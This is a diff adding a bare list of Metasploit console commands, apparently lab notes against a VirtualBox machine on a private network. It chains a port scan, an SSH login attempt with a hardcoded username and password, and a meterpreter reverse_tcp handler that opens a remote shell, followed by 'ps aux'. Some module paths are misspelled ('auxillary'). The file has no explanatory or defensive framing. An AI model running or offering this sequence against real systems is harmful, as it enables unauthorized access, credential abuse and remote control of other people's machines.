@@ -1,0 +1,38 @@
+> msfconsole
+
+> use auxillary/scanner/portscan/tcp
+
+> set RHOSTS 192.168.1.15
+
+> set PORTS 1-1000
+
+> show options
+
+> run
+
+
+> use auxillary/scanner/ssh/ssh_login
+
+> setg RHOSTS 192.168.1.15
+
+> set USERNAME mackajay-VirtualBox
+
+> set PASSWORD eisha123
+
+> run
+
+
+> search exploit ssh 
+
+> use exploit/multi/handler
+
+> set payload Linux/x86/meterpreter/reverse_tcp
+
+> set LHOST 192.168.1.13
+
+> set LPORT 4444
+
+> run
+
+
+> ps aux
